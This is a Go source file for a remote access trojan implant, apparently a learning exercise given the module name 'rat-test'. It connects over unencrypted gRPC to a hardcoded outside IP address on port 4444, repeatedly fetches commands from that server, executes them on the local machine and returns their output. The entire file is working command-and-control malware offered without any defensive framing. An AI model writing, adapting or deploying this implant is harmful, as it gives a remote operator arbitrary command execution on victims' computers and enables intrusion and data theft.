package main

import (
	"context"
	"log"
	"os/exec"
	"rat-test/grpcapi"
	"strings"
	"time"

	"google.golang.org/grpc"
)

func main() {
	var opts []grpc.DialOption
	opts = append(opts, grpc.WithInsecure())

	conn, err := grpc.Dial("198.181.57.200:4444", opts...)
	if err != nil {
		log.Fatalln(err)
	}
	defer conn.Close()

	client := grpcapi.NewImplantClient(conn)
	ctx := context.Background()

	for {
		cmd, err := client.FetchCommand(ctx, &grpcapi.Empty{})
		if err != nil {
			log.Fatal(err)
		}
		if cmd.In == "" {
			time.Sleep(3 * time.Second)
			continue
		}
		tokens := strings.Split(cmd.In, " ")
		var c *exec.Cmd
		if len(tokens) == 1 {
			c = exec.Command(tokens[0])
		} else {
			c = exec.Command(tokens[0], tokens[1:]...)
		}
		buf, err := c.CombinedOutput()
		if err != nil {
			log.Fatalln(err)
		}
		cmd.Out += string(buf)
		client.SendOutput(ctx, cmd)
	}
}
